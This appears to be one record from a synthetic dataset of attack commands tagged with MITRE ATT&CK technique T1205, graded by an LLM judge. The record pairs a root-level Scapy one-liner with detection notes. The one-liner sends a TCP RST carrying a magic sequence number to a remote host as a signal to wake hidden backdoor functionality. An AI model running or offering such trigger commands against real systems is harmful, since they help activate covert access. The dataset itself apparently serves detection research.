@@ -1,0 +1,37 @@
+{
+  "technique_id": "T1205",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo bash -c 'python3 - << \"PY\"\\nfrom scapy.all import IP, TCP, send\\npkt = IP(dst=\"198.51.100.77\")/TCP(dport=443, flags=\"R\", seq=0x41414141)\\nsend(pkt, verbose=0)\\nPY'",
+  "explanation": "Sends a crafted TCP RST with a magic sequence number (0x41414141) to 198.51.100.77:443 as a signaling packet to awaken hidden functionality on the remote end. Raw sockets require sudo/root.",
+  "rationale_steps": [
+    "Leverage unusual TCP control packet fields as a signaling channel.",
+    "No obfuscation; relies on header values unlikely in normal flows.",
+    "Detection: NIDS rules for odd TCP RSTs with fixed sequences; correlation with remote service behavior changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-fe1a2ad7-9156f766",
+  "source_prompt_hash": "fe1a2ad7",
+  "timestamp_utc": "2025-09-30T06:07:36.671120Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting with a quoted here-document delimiter cleanly feeds a valid Python/Scapy script via sudo bash -c.",
+        "semantic_score": 4,
+        "semantic_justification": "It crafts and sends a TCP RST with a magic sequence using Scapy consistent with traffic signaling (T1205), though the use of a documentation-only IP reduces operational realism.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T19:28:09.969374Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
